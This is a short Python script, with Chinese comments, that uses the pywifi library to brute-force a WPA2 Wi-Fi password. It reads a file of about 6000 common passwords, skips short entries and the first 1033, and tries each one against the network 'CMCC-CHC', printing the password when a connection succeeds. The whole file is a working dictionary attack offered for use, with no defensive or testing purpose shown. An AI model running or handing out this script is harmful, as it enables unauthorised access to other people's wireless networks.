# -*- coding: utf-8 -*-
"""
-------------------------------------------------
   File Name：       wifi_test001.py 
   Description :     
   Author :          cugxy 
   date：            2020/05/20 
-------------------------------------------------
   Change Activity:
                     2020/05/20 
-------------------------------------------------
"""

import time

import pywifi
from pywifi import const


class Pwd(object):
    def __init__(self, name):
        self.name = name                            # wifi名称
        wifi = pywifi.PyWiFi()                      # 抓取网卡接口
        self.iface = wifi.interfaces()[0]           # 获取网卡
        self.iface.disconnect()                     # 断开所有连接
        time.sleep(1)
        if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:  # 测试是否已经断开网卡连接
            print("已经成功断开网卡连接")
        else:
            print("网卡连接断开失败")

    def solve(self):
        with open('6000常用密码字典.txt', 'r') as f:
            idx = 0
            line = f.readline()
            while line:
                line = line.strip()
                if len(line) < 8:
                    line = f.readline()
                    continue
                idx += 1
                if idx <= 1033:
                    continue
                profile = pywifi.Profile()                              # 创建wifi配置对象
                profile.ssid = self.name
                profile.key = line                                      # WiFi密码
                profile.auth = const.AUTH_ALG_OPEN                      # 网卡的开放
                profile.akm.append(const.AKM_TYPE_WPA2PSK)              # wifi加密算法，一般是 WPA2PSK
                profile.cipher = const.CIPHER_TYPE_CCMP                 # 加密单元
                tem_profile = self.iface.add_network_profile(profile)   # 添加新的WiFi文件
                self.iface.connect(tem_profile)                         # 连接
                time.sleep(3)                                           # 连接需要时间
                if self.iface.status() == const.IFACE_CONNECTED:        # 判断是否连接成功
                    print("\033[31m第 %d 尝试, 成功连接，密码是 %s\033[0m" % (idx, line, ))
                    break
                else:
                    print("\033[34m第 %d 尝试, 连接失败 %s\033[0m" % (idx, line, ))
                line = f.readline()


if __name__ == '__main__':
    if 1:
        pwd = Pwd('CMCC-CHC')
        pwd.solve()
